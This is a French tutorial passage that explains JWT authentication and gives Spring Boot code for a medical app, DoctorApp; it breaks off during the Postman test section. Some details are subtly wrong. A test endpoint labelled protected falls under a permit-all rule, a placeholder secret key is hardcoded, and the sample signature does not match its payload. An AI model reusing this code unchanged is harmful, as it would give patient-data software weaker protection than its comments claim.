# 📚 COURS COMPLET : JWT (JSON Web Tokens)

Pour une application comme DoctorApp

---

## 📖 TABLE DES MATIÈRES

1. [Qu'est-ce qu'un JWT ?](#1-intro)
2. [Session vs JWT : Quelle différence ?](#2-comparison)
3. [Structure d'un JWT](#3-structure)
4. [Comment fonctionne JWT ?](#4-fonctionnement)
5. [Avantages et inconvénients](#5-pros-cons)
6. [Architecture JWT pour DoctorApp](#6-architecture)
7. [Implémentation complète](#7-implementation)
8. [Sécurité et bonnes pratiques](#8-security)
9. [Refresh Token](#9-refresh)
10. [Exercices pratiques](#10-exercices)

---

<a name="1-intro"></a>
## 1️⃣ QU'EST-CE QU'UN JWT ?

### Définition

**JWT (JSON Web Token)** est un standard ouvert (RFC 7519) qui permet de transmettre des informations de manière sécurisée entre deux parties sous forme de **token**.

Un JWT est une **chaîne de caractères** qui contient :
- 👤 Des informations sur l'utilisateur (claims)
- ✍️ Une signature cryptographique pour vérifier son authenticité

### Exemple de JWT

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkRyLiBNYXJ0aW4iLCJyb2xlcyI6WyJET0NUT1IiXSwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

Cette longue chaîne est en fait composée de **3 parties** séparées par des points (`.`).

---

<a name="2-comparison"></a>
## 2️⃣ SESSION vs JWT : QUELLE DIFFÉRENCE ?

### 🍪 Système à SESSION (ton code actuel)

```
┌─────────────┐                         ┌─────────────┐
│   Client    │                         │   Serveur   │
│ (Navigateur)│                         │   Spring    │
└──────┬──────┘                         └──────┬──────┘
       │                                       │
       │ 1. POST /login (email + password)     │
       │──────────────────────────────────────>│
       │                                       │
       │                    2. Vérifie en BDD  │
       │                    3. Crée SESSION    │
       │                       en MÉMOIRE      │
       │                                       │
       │ 4. Retourne JSESSIONID (cookie)       │
       │<──────────────────────────────────────│
       │                                       │
       │ 5. GET /dashboard                     │
       │    Cookie: JSESSIONID=abc123          │
       │──────────────────────────────────────>│
       │                                       │
       │              6. Cherche SESSION abc123│
       │                 dans la MÉMOIRE       │
       │                 Trouve l'utilisateur  │
       │                                       │
       │ 7. Retourne la page                   │
       │<──────────────────────────────────────│
```

**Problèmes avec les SESSIONS** :
- ❌ Les sessions sont stockées **en mémoire sur le serveur**
- ❌ Difficile à scaler (load balancing)
- ❌ Ne fonctionne pas bien avec les applications mobiles
- ❌ CORS compliqué

---

### 🎫 Système à JWT

```
┌─────────────┐                         ┌─────────────┐
│   Client    │                         │   Serveur   │
│ (App/Web)   │                         │   Spring    │
└──────┬──────┘                         └──────┬──────┘
       │                                       │
       │ 1. POST /api/auth/login               │
       │    { email, password }                │
       │──────────────────────────────────────>│
       │                                       │
       │                    2. Vérifie en BDD  │
       │                    3. Génère JWT      │
       │                       (pas de session)│
       │                                       │
       │ 4. Retourne JWT                       │
       │    { token: "eyJhbGc..." }            │
       │<──────────────────────────────────────│
       │                                       │
       │ 5. Stocke JWT localement              │
       │    (localStorage ou mémoire)          │
       │                                       │
       │ 6. GET /api/appointments              │
       │    Authorization: Bearer eyJhbGc...   │
       │──────────────────────────────────────>│
       │                                       │
       │              7. Vérifie JWT signature │
       │                 Extrait l'utilisateur │
       │                 du JWT directement    │
       │                 (pas de BDD !)        │
       │                                       │
       │ 8. Retourne les données               │
       │<──────────────────────────────────────│
```

**Avantages du JWT** :
- ✅ **Stateless** : Le serveur ne stocke rien en mémoire
- ✅ **Scalable** : Fonctionne avec plusieurs serveurs
- ✅ **Mobile-friendly** : Pas de cookies
- ✅ **CORS simple** : Juste un header HTTP
- ✅ **Microservices** : Le token peut être partagé entre services

---

### 📊 Comparaison détaillée

| Critère | SESSION | JWT |
|---------|---------|-----|
| **Stockage serveur** | ✅ Session en mémoire | ❌ Aucun |
| **Stockage client** | Cookie (automatique) | localStorage/mémoire (manuel) |
| **Scalabilité** | ❌ Difficile (sticky sessions) | ✅ Facile (stateless) |
| **Taille** | ✅ Petit (juste un ID) | ❌ Plus gros (~200-500 bytes) |
| **Révocation** | ✅ Immédiate | ❌ Difficile (expiration) |
| **Sécurité XSS** | ✅ Cookie HttpOnly | ❌ Si dans localStorage |
| **Applications mobiles** | ❌ Cookies compliqués | ✅ Naturel |
| **Microservices** | ❌ Compliqué | ✅ Parfait |

---

<a name="3-structure"></a>
## 3️⃣ STRUCTURE D'UN JWT

Un JWT est composé de **3 parties** :

```
HEADER.PAYLOAD.SIGNATURE
```

### 🔷 Partie 1 : HEADER (En-tête)

Contient le type de token et l'algorithme de signature.

```json
{
  "alg": "HS256",      // Algorithme : HMAC SHA-256
  "typ": "JWT"         // Type : JSON Web Token
}
```

Encodé en **Base64URL** :
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
```

---

### 🔷 Partie 2 : PAYLOAD (Données)

Contient les **claims** (déclarations) sur l'utilisateur.

#### Claims standards (recommandés) :

```json
{
  "sub": "123",                           // Subject (ID utilisateur)
  "email": "martin@doctorapp.com",        // Email
  "name": "Dr. Martin",                   // Nom
  "roles": ["DOCTOR"],                    // Rôles
  "permissions": ["patient:read"],        // Permissions
  "iat": 1516239022,                      // Issued At (date de création)
  "exp": 1516242622                       // Expiration (1 heure après)
}
```

Encodé en **Base64URL** :
```
eyJzdWIiOiIxMjMiLCJlbWFpbCI6Im1hcnRpbkBkb2N0b3JhcHAuY29tIiwicm9sZXMiOlsiRE9DVE9SIl0sImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxNTE2MjQyNjIyfQ
```

**⚠️ ATTENTION** : Le payload est **encodé, PAS chiffré** ! N'importe qui peut le décoder.

**Ne mets JAMAIS** :
- ❌ Mots de passe
- ❌ Numéros de carte bancaire
- ❌ Données sensibles

---

### 🔷 Partie 3 : SIGNATURE

Garantit que le token n'a pas été modifié.

**Formule** :
```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  SECRET_KEY
)
```

**Exemple** :
```javascript
// Données
const header = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9";
const payload = "eyJzdWIiOiIxMjMiLCJuYW1lIjoiRHIuIE1hcnRpbiJ9";

// Clé secrète (gardée sur le serveur !)
const secretKey = "ma-super-cle-secrete-tres-longue-et-complexe";

// Signature
const signature = HMACSHA256(header + "." + payload, secretKey);
// → "SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
```

---

### 🔗 JWT complet

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
.
eyJzdWIiOiIxMjMiLCJlbWFpbCI6Im1hcnRpbkBkb2N0b3JhcHAuY29tIiwicm9sZXMiOlsiRE9DVE9SIl0sImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxNTE2MjQyNjIyfQ
.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

Tu peux décoder un JWT sur https://jwt.io !

---

<a name="4-fonctionnement"></a>
## 4️⃣ COMMENT FONCTIONNE JWT ?

### Cycle de vie complet

```
┌──────────────────────────────────────────────────────────┐
│                    1. GÉNÉRATION                         │
└──────────────────────────────────────────────────────────┘

Utilisateur se connecte
         ↓
Serveur vérifie email/password
         ↓
Serveur crée JWT :
  - Header : { alg: "HS256", typ: "JWT" }
  - Payload : { sub: "123", email: "...", roles: [...], exp: ... }
  - Signature : HMAC(header + payload, SECRET_KEY)
         ↓
Serveur retourne JWT au client


┌──────────────────────────────────────────────────────────┐
│                    2. STOCKAGE                           │
└──────────────────────────────────────────────────────────┘

Client reçoit JWT
         ↓
Stocke dans :
  - localStorage (Web)
  - sessionStorage (Web)
  - Mémoire (React/Angular state)
  - Keychain (iOS)
  - SharedPreferences (Android)


┌──────────────────────────────────────────────────────────┐
│                    3. UTILISATION                        │
└──────────────────────────────────────────────────────────┘

Client fait une requête API
         ↓
Ajoute JWT dans le header :
  Authorization: Bearer eyJhbGc...
         ↓
Serveur reçoit la requête


┌──────────────────────────────────────────────────────────┐
│                    4. VÉRIFICATION                       │
└──────────────────────────────────────────────────────────┘

Serveur extrait JWT du header
         ↓
Vérifie la signature :
  - Recalcule HMAC(header + payload, SECRET_KEY)
  - Compare avec la signature reçue
         ↓
Si signature OK :
  ✅ Le token est valide et n'a pas été modifié
         ↓
Vérifie l'expiration :
  - Compare exp avec l'heure actuelle
         ↓
Si non expiré :
  ✅ Extrait les données du payload
  ✅ Charge l'utilisateur avec ses rôles/permissions
         ↓
Autorise ou refuse l'accès
```

---

<a name="5-pros-cons"></a>
## 5️⃣ AVANTAGES ET INCONVÉNIENTS

### ✅ Avantages

1. **Stateless (sans état)**
    - Le serveur ne stocke rien en mémoire
    - Parfait pour scaler horizontalement

2. **Scalabilité**
   ```
   ┌──────┐     ┌──────┐     ┌──────┐
   │Server│     │Server│     │Server│
   │  1   │     │  2   │     │  3   │
   └───┬──┘     └───┬──┘     └───┬──┘
       │            │            │
       └────────────┴────────────┘
              Load Balancer
                    ↑
              Même JWT fonctionne
              sur tous les serveurs !
   ```

3. **Mobile-friendly**
    - Pas de cookies (complexes sur mobile)
    - Simple header HTTP

4. **Microservices**
    - Le même token peut authentifier sur plusieurs services

5. **CORS facile**
    - Pas de problèmes de cookies cross-domain

---

### ❌ Inconvénients

1. **Révocation difficile**
    - Une fois émis, le JWT est valide jusqu'à expiration
    - Impossible de "déconnecter" un utilisateur immédiatement

   **Solutions** :
    - Courtes expirations (15 min)
    - Refresh tokens
    - Blacklist de tokens (liste noire)

2. **Taille**
    - JWT = ~200-500 bytes
    - Envoyé à **chaque requête**
    - Session = juste un petit ID

3. **Sécurité XSS**
    - Si stocké dans `localStorage` → vulnérable aux attaques XSS
    - Un script malveillant peut voler le token

   **Solution** :
    - Stocker en mémoire (state React/Angular)
    - Ou utiliser des cookies `HttpOnly` + `SameSite`

4. **Pas de modification en temps réel**
    - Si tu changes les rôles d'un utilisateur en BDD
    - Son JWT actuel aura encore les anciens rôles
    - Il faut attendre l'expiration ou forcer une re-connexion

---

<a name="6-architecture"></a>
## 6️⃣ ARCHITECTURE JWT POUR DOCTORAPP

### Structure du projet

```
DoctorApp/
│
├── Entity/
│   ├── Utilisateur.java
│   ├── Role.java
│   └── Permission.java
│
├── Repository/
│   ├── UtilisateursRepository.java
│   ├── RoleRepository.java
│   └── PermissionRepository.java
│
├── Security/
│   ├── JwtUtil.java                    ← Génération/validation JWT
│   ├── JwtAuthenticationFilter.java    ← Filtre pour vérifier JWT
│   ├── JwtAuthenticationEntryPoint.java ← Gestion erreurs 401
│   ├── SecurityConfig.java             ← Configuration Spring Security
│   └── CustomUserDetailsService.java   ← Charge utilisateurs
│
├── Service/
│   ├── AuthenticationService.java      ← Login/Register
│   └── UtilisateurService.java
│
├── Controller/
│   ├── AuthController.java             ← POST /api/auth/login
│   ├── PatientController.java
│   └── AppointmentController.java
│
└── DTO/
    ├── LoginRequest.java               ← { email, password }
    ├── LoginResponse.java              ← { token, type, expiresIn }
    └── RegisterRequest.java
```

---

### Flux d'authentification

```
┌─────────────┐                              ┌─────────────┐
│   Client    │                              │   Spring    │
└──────┬──────┘                              └──────┬──────┘
       │                                            │
       │ 1. POST /api/auth/login                    │
       │    { "email": "doctor@mail.com",           │
       │      "password": "12345" }                 │
       │───────────────────────────────────────────>│
       │                                            │
       │                        AuthController      │
       │                               ↓            │
       │                    AuthenticationService   │
       │                               ↓            │
       │             CustomUserDetailsService       │
       │                               ↓            │
       │                   Vérifie en BDD           │
       │                               ↓            │
       │                    JwtUtil.generateToken() │
       │                               ↓            │
       │ 2. { "token": "eyJhbGc...",                │
       │      "type": "Bearer",                     │
       │      "expiresIn": 3600 }                   │
       │<───────────────────────────────────────────│
       │                                            │
       │ 3. Client stocke le token                  │
       │                                            │
       │ 4. GET /api/patients                       │
       │    Authorization: Bearer eyJhbGc...        │
       │───────────────────────────────────────────>│
       │                                            │
       │                JwtAuthenticationFilter     │
       │                               ↓            │
       │              Extrait JWT du header         │
       │                               ↓            │
       │              JwtUtil.validateToken()       │
       │                               ↓            │
       │              JwtUtil.extractUsername()     │
       │                               ↓            │
       │              CustomUserDetailsService      │
       │                               ↓            │
       │              Charge l'utilisateur          │
       │                               ↓            │
       │              Crée Authentication           │
       │                               ↓            │
       │              SecurityContext               │
       │                               ↓            │
       │              PatientController             │
       │                               ↓            │
       │ 5. { "patients": [...] }                   │
       │<───────────────────────────────────────────│
```

---

<a name="7-implementation"></a>
## 7️⃣ IMPLÉMENTATION COMPLÈTE

### 📦 Étape 1 : Dépendances Maven

Ajoute dans ton `pom.xml` :

```xml
<dependencies>
    <!-- Dépendances existantes... -->
    
    <!-- JWT -->
    <dependency>
        <groupId>io.jsonwebtoken</groupId>
        <artifactId>jjwt-api</artifactId>
        <version>0.12.3</version>
    </dependency>
    <dependency>
        <groupId>io.jsonwebtoken</groupId>
        <artifactId>jjwt-impl</artifactId>
        <version>0.12.3</version>
        <scope>runtime</scope>
    </dependency>
    <dependency>
        <groupId>io.jsonwebtoken</groupId>
        <artifactId>jjwt-jackson</artifactId>
        <version>0.12.3</version>
        <scope>runtime</scope>
    </dependency>
</dependencies>
```

---

### ⚙️ Étape 2 : Configuration (application.properties)

```properties
# ===============================
# JWT CONFIGURATION
# ===============================
# Clé secrète (minimum 256 bits / 32 caractères)
# ⚠️ CHANGE CETTE CLÉ EN PRODUCTION !
jwt.secret=ma-super-cle-secrete-tres-longue-pour-jwt-doctorapp-2024

# Durée de validité du token (en millisecondes)
# 1 heure = 3600000 ms
jwt.expiration=3600000

# Durée du refresh token (7 jours)
jwt.refresh-expiration=604800000
```

---

### 🔧 Étape 3 : JwtUtil.java - Utilitaire JWT

```java
package DoctorApp.DoctorApp.Security;

import io.jsonwebtoken.*;
import io.jsonwebtoken.security.Keys;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.stereotype.Component;

import javax.crypto.SecretKey;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;
import java.util.function.Function;
import java.util.stream.Collectors;

@Component
public class JwtUtil {

    @Value("${jwt.secret}")
    private String SECRET_KEY;

    @Value("${jwt.expiration}")
    private Long JWT_EXPIRATION;

    // 🔑 Générer la clé de signature
    private SecretKey getSigningKey() {
        return Keys.hmacShaKeyFor(SECRET_KEY.getBytes());
    }

    // 📧 Extraire l'email (username) du token
    public String extractUsername(String token) {
        return extractClaim(token, Claims::getSubject);
    }

    // 📅 Extraire la date d'expiration
    public Date extractExpiration(String token) {
        return extractClaim(token, Claims::getExpiration);
    }

    // 🎯 Extraire un claim spécifique
    public <T> T extractClaim(String token, Function<Claims, T> claimsResolver) {
        final Claims claims = extractAllClaims(token);
        return claimsResolver.apply(claims);
    }

    // 📋 Extraire tous les claims
    private Claims extractAllClaims(String token) {
        return Jwts.parser()
                .verifyWith(getSigningKey())
                .build()
                .parseSignedClaims(token)
                .getPayload();
    }

    // ⏰ Vérifier si le token est expiré
    private Boolean isTokenExpired(String token) {
        return extractExpiration(token).before(new Date());
    }

    // 🎫 Générer un token pour un utilisateur
    public String generateToken(UserDetails userDetails) {
        Map<String, Object> claims = new HashMap<>();
        
        // Ajouter les rôles dans le token
        claims.put("roles", userDetails.getAuthorities().stream()
                .map(GrantedAuthority::getAuthority)
                .collect(Collectors.toList()));
        
        return createToken(claims, userDetails.getUsername());
    }

    // 🏗️ Créer le token JWT
    private String createToken(Map<String, Object> claims, String subject) {
        Date now = new Date();
        Date expirationDate = new Date(now.getTime() + JWT_EXPIRATION);

        return Jwts.builder()
                .claims(claims)                      // Données custom
                .subject(subject)                    // Email (username)
                .issuedAt(now)                       // Date de création
                .expiration(expirationDate)          // Date d'expiration
                .signWith(getSigningKey())           // Signature
                .compact();
    }

    // ✅ Valider le token
    public Boolean validateToken(String token, UserDetails userDetails) {
        try {
            final String username = extractUsername(token);
            return (username.equals(userDetails.getUsername()) && !isTokenExpired(token));
        } catch (JwtException | IllegalArgumentException e) {
            return false;
        }
    }

    // 🔍 Valider le token (sans UserDetails)
    public Boolean validateToken(String token) {
        try {
            extractAllClaims(token);
            return !isTokenExpired(token);
        } catch (JwtException | IllegalArgumentException e) {
            return false;
        }
    }
}
```

**Explication** :

- `generateToken()` : Crée un JWT avec l'email et les rôles
- `validateToken()` : Vérifie que le token est valide et non expiré
- `extractUsername()` : Extrait l'email du token
- `extractAllClaims()` : Décode le payload

---

### 🛡️ Étape 4 : JwtAuthenticationFilter.java - Filtre de sécurité

```java
package DoctorApp.DoctorApp.Security;

import DoctorApp.DoctorApp.Service.CustomUserDetailsService;
import jakarta.servlet.FilterChain;
import jakarta.servlet.ServletException;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import lombok.RequiredArgsConstructor;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.web.authentication.WebAuthenticationDetailsSource;
import org.springframework.stereotype.Component;
import org.springframework.web.filter.OncePerRequestFilter;

import java.io.IOException;

@Component
@RequiredArgsConstructor
public class JwtAuthenticationFilter extends OncePerRequestFilter {

    private final JwtUtil jwtUtil;
    private final CustomUserDetailsService userDetailsService;

    @Override
    protected void doFilterInternal(
            HttpServletRequest request,
            HttpServletResponse response,
            FilterChain filterChain
    ) throws ServletException, IOException {

        // 1️⃣ Extraire le header Authorization
        final String authorizationHeader = request.getHeader("Authorization");

        String username = null;
        String jwt = null;

        // 2️⃣ Vérifier que le header contient "Bearer "
        if (authorizationHeader != null && authorizationHeader.startsWith("Bearer ")) {
            // Extraire le token (enlever "Bearer ")
            jwt = authorizationHeader.substring(7);
            
            try {
                // Extraire l'email du token
                username = jwtUtil.extractUsername(jwt);
            } catch (Exception e) {
                logger.error("Impossible d'extraire le username du JWT", e);
            }
        }

        // 3️⃣ Si on a un username ET qu'il n'y a pas déjà d'authentification
        if (username != null && SecurityContextHolder.getContext().getAuthentication() == null) {
            
            // Charger l'utilisateur depuis la BDD
            UserDetails userDetails = userDetailsService.loadUserByUsername(username);

            // 4️⃣ Valider le token
            if (jwtUtil.validateToken(jwt, userDetails)) {
                
                // 5️⃣ Créer l'objet Authentication
                UsernamePasswordAuthenticationToken authToken =
                        new UsernamePasswordAuthenticationToken(
                                userDetails,
                                null,
                                userDetails.getAuthorities()
                        );

                authToken.setDetails(
                        new WebAuthenticationDetailsSource().buildDetails(request)
                );

                // 6️⃣ Mettre l'utilisateur dans le SecurityContext
                SecurityContextHolder.getContext().setAuthentication(authToken);
            }
        }

        // 7️⃣ Continuer la chaîne de filtres
        filterChain.doFilter(request, response);
    }
}
```

**Ce filtre** :
1. Intercepte **chaque requête**
2. Extrait le JWT du header `Authorization: Bearer xxx`
3. Valide le token
4. Charge l'utilisateur
5. Le met dans le `SecurityContext`

---

### 🚫 Étape 5 : JwtAuthenticationEntryPoint.java - Gestion erreurs 401

```java
package DoctorApp.DoctorApp.Security;

import com.fasterxml.jackson.databind.ObjectMapper;
import jakarta.servlet.ServletException;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import org.springframework.security.core.AuthenticationException;
import org.springframework.security.web.AuthenticationEntryPoint;
import org.springframework.stereotype.Component;

import java.io.IOException;
import java.util.HashMap;
import java.util.Map;

@Component
public class JwtAuthenticationEntryPoint implements AuthenticationEntryPoint {

    @Override
    public void commence(
            HttpServletRequest request,
            HttpServletResponse response,
            AuthenticationException authException
    ) throws IOException, ServletException {
        
        // Retourner une erreur 401 Unauthorized en JSON
        response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);
        response.setContentType("application/json");

        Map<String, Object> data = new HashMap<>();
        data.put("status", 401);
        data.put("error", "Unauthorized");
        data.put("message", "Token manquant ou invalide");
        data.put("path", request.getRequestURI());

        ObjectMapper mapper = new ObjectMapper();
        response.getWriter().write(mapper.writeValueAsString(data));
    }
}
```

---

### ⚙️ Étape 6 : SecurityConfig.java - Configuration Spring Security

```java
package DoctorApp.DoctorApp.Security;

import DoctorApp.DoctorApp.Service.CustomUserDetailsService;
import lombok.RequiredArgsConstructor;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.authentication.AuthenticationManager;
import org.springframework.security.authentication.AuthenticationProvider;
import org.springframework.security.authentication.dao.DaoAuthenticationProvider;
import org.springframework.security.config.annotation.authentication.configuration.AuthenticationConfiguration;
import org.springframework.security.config.annotation.method.configuration.EnableMethodSecurity;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.config.annotation.web.configurers.AbstractHttpConfigurer;
import org.springframework.security.config.http.SessionCreationPolicy;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.security.web.SecurityFilterChain;
import org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter;

@Configuration
@EnableWebSecurity
@EnableMethodSecurity(prePostEnabled = true)
@RequiredArgsConstructor
public class SecurityConfig {

    private final CustomUserDetailsService userDetailsService;
    private final JwtAuthenticationFilter jwtAuthenticationFilter;
    private final JwtAuthenticationEntryPoint jwtAuthenticationEntryPoint;

    @Bean
    public PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder();
    }

    @Bean
    public AuthenticationProvider authenticationProvider() {
        DaoAuthenticationProvider provider = new DaoAuthenticationProvider();
        provider.setUserDetailsService(userDetailsService);
        provider.setPasswordEncoder(passwordEncoder());
        return provider;
    }

    @Bean
    public AuthenticationManager authenticationManager(AuthenticationConfiguration config) 
            throws Exception {
        return config.getAuthenticationManager();
    }

    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        return http
                // ❌ Désactiver CSRF (pas nécessaire avec JWT)
                .csrf(AbstractHttpConfigurer::disable)
                
                // 🔐 Autorisation des requêtes
                .authorizeHttpRequests(auth -> auth
                        // 🟢 Public - Pas de token requis
                        .requestMatchers(
                                "/api/auth/**",      // Login, Register
                                "/",
                                "/css/**",
                                "/js/**",
                                "/images/**"
                        ).permitAll()
                        
                        // 🔴 Admin seulement
                        .requestMatchers("/api/admin/**").hasRole("ADMIN")
                        
                        // 🟡 Doctor ou Admin
                        .requestMatchers(
                                "/api/appointments/**",
                                "/api/prescriptions/**"
                        ).hasAnyRole("DOCTOR", "ADMIN")
                        
                        // 🔵 Tout le reste → authentification requise
                        .anyRequest().authenticated()
                )
                
                // 🚫 Gestion des erreurs 401
                .exceptionHandling(ex -> ex
                        .authenticationEntryPoint(jwtAuthenticationEntryPoint)
                )
                
                // 📭 STATELESS - Pas de sessions !
                .sessionManagement(session -> session
                        .sessionCreationPolicy(SessionCreationPolicy.STATELESS)
                )
                
                // 🔌 Provider d'authentification
                .authenticationProvider(authenticationProvider())
                
                // 🛡️ Ajouter le filtre JWT AVANT le filtre d'authentification de Spring
                .addFilterBefore(
                        jwtAuthenticationFilter,
                        UsernamePasswordAuthenticationFilter.class
                )
                
                .build();
    }
}
```

**Points clés** :

- ✅ `csrf().disable()` : CSRF inutile avec JWT
- ✅ `sessionCreationPolicy(STATELESS)` : Pas de sessions !
- ✅ `addFilterBefore()` : Notre filtre JWT s'exécute en premier

---

### 📝 Étape 7 : DTOs (Data Transfer Objects)

**LoginRequest.java** :
```java
package DoctorApp.DoctorApp.DTO;

import jakarta.validation.constraints.Email;
import jakarta.validation.constraints.NotBlank;
import lombok.Data;

@Data
public class LoginRequest {
    
    @NotBlank(message = "L'email est obligatoire")
    @Email(message = "Email invalide")
    private String email;
    
    @NotBlank(message = "Le mot de passe est obligatoire")
    private String password;
}
```

**LoginResponse.java** :
```java
package DoctorApp.DoctorApp.DTO;

import lombok.AllArgsConstructor;
import lombok.Builder;
import lombok.Data;

import java.util.List;

@Data
@Builder
@AllArgsConstructor
public class LoginResponse {
    
    private String token;
    private String type = "Bearer";
    private Long expiresIn;  // en secondes
    private String email;
    private List<String> roles;
}
```

**RegisterRequest.java** :
```java
package DoctorApp.DoctorApp.DTO;

import jakarta.validation.constraints.Email;
import jakarta.validation.constraints.NotBlank;
import jakarta.validation.constraints.Size;
import lombok.Data;

@Data
public class RegisterRequest {
    
    @NotBlank(message = "Le nom est obligatoire")
    private String nom;
    
    @NotBlank(message = "L'email est obligatoire")
    @Email(message = "Email invalide")
    private String email;
    
    @NotBlank(message = "Le mot de passe est obligatoire")
    @Size(min = 6, message = "Le mot de passe doit contenir au moins 6 caractères")
    private String password;
}
```

---

### 🎯 Étape 8 : AuthenticationService.java

```java
package DoctorApp.DoctorApp.Service;

import DoctorApp.DoctorApp.DTO.LoginRequest;
import DoctorApp.DoctorApp.DTO.LoginResponse;
import DoctorApp.DoctorApp.DTO.RegisterRequest;
import DoctorApp.DoctorApp.Entity.Role;
import DoctorApp.DoctorApp.Entity.Utilisateur;
import DoctorApp.DoctorApp.Security.JwtUtil;
import DoctorApp.DoctorApp.repository.RoleRepository;
import DoctorApp.DoctorApp.repository.UtilisateursRepository;
import lombok.RequiredArgsConstructor;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.security.authentication.AuthenticationManager;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.stereotype.Service;

import java.util.Set;
import java.util.stream.Collectors;

@Service
@RequiredArgsConstructor
public class AuthenticationService {

    private final AuthenticationManager authenticationManager;
    private final UtilisateursRepository utilisateursRepository;
    private final RoleRepository roleRepository;
    private final PasswordEncoder passwordEncoder;
    private final JwtUtil jwtUtil;
    
    @Value("${jwt.expiration}")
    private Long jwtExpiration;

    // 🔐 LOGIN
    public LoginResponse login(LoginRequest request) {
        
        // 1️⃣ Authentifier l'utilisateur
        Authentication authentication = authenticationManager.authenticate(
                new UsernamePasswordAuthenticationToken(
                        request.getEmail(),
                        request.getPassword()
                )
        );

        // 2️⃣ Récupérer l'utilisateur authentifié
        UserDetails userDetails = (UserDetails) authentication.getPrincipal();

        // 3️⃣ Générer le JWT
        String token = jwtUtil.generateToken(userDetails);

        // 4️⃣ Extraire les rôles
        java.util.List<String> roles = userDetails.getAuthorities().stream()
                .map(GrantedAuthority::getAuthority)
                .collect(Collectors.toList());

        // 5️⃣ Retourner la réponse
        return LoginResponse.builder()
                .token(token)
                .type("Bearer")
                .expiresIn(jwtExpiration / 1000)  // Convertir ms en secondes
                .email(userDetails.getUsername())
                .roles(roles)
                .build();
    }

    // ✍️ REGISTER
    public Utilisateur register(RegisterRequest request) {
        
        // 1️⃣ Vérifier si l'email existe déjà
        if (utilisateursRepository.existsByEmail(request.getEmail())) {
            throw new RuntimeException("Cet email est déjà utilisé");
        }

        // 2️⃣ Encoder le mot de passe
        String encodedPassword = passwordEncoder.encode(request.getPassword());

        // 3️⃣ Récupérer le rôle PATIENT par défaut
        Role patientRole = roleRepository.findByNom("PATIENT")
                .orElseThrow(() -> new RuntimeException("Rôle PATIENT non trouvé"));

        // 4️⃣ Créer l'utilisateur
        Utilisateur user = Utilisateur.builder()
                .nom(request.getNom())
                .email(request.getEmail())
                .password(encodedPassword)
                .enabled(true)
                .accountLocked(false)
                .roles(Set.of(patientRole))
                .build();

        // 5️⃣ Sauvegarder
        return utilisateursRepository.save(user);
    }
}
```

---

### 🎮 Étape 9 : AuthController.java

```java
package DoctorApp.DoctorApp.Controller;

import DoctorApp.DoctorApp.DTO.LoginRequest;
import DoctorApp.DoctorApp.DTO.LoginResponse;
import DoctorApp.DoctorApp.DTO.RegisterRequest;
import DoctorApp.DoctorApp.Entity.Utilisateur;
import DoctorApp.DoctorApp.Service.AuthenticationService;
import jakarta.validation.Valid;
import lombok.RequiredArgsConstructor;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;

import java.util.HashMap;
import java.util.Map;

@RestController
@RequestMapping("/api/auth")
@RequiredArgsConstructor
public class AuthController {

    private final AuthenticationService authenticationService;

    // 🔐 POST /api/auth/login
    @PostMapping("/login")
    public ResponseEntity<LoginResponse> login(@Valid @RequestBody LoginRequest request) {
        LoginResponse response = authenticationService.login(request);
        return ResponseEntity.ok(response);
    }

    // ✍️ POST /api/auth/register
    @PostMapping("/register")
    public ResponseEntity<Map<String, String>> register(@Valid @RequestBody RegisterRequest request) {
        Utilisateur user = authenticationService.register(request);
        
        Map<String, String> response = new HashMap<>();
        response.put("message", "Utilisateur créé avec succès");
        response.put("email", user.getEmail());
        
        return ResponseEntity.ok(response);
    }

    // 🧪 Test endpoint (protégé)
    @GetMapping("/test")
    public ResponseEntity<Map<String, String>> test() {
        Map<String, String> response = new HashMap<>();
        response.put("message", "JWT fonctionne !");
        return ResponseEntity.ok(response);
    }
}
```

---

### 🧪 Étape 10 : Tester avec Postman

#### 1️⃣ **Créer un compte**

```http
POST http://localhost:8080/api/auth/register
Content-Type: application/json

{
  "nom": "Dr. Martin",
  "email": "martin@doctorapp.com",
  "password": "password123"
}
```

**Réponse** :
```json
{
  "message": "Utilisateur créé avec succès",
  "email": "martin@doctorapp.com"
}
```

---

#### 2️⃣ **Se connecter**

```http
POST http://localhost:8080/api/auth/login
Content-Type: application/json

{
  "email": "martin@doctorapp.com",
  "password": "password123"
}
```

**Réponse** :
```json
{
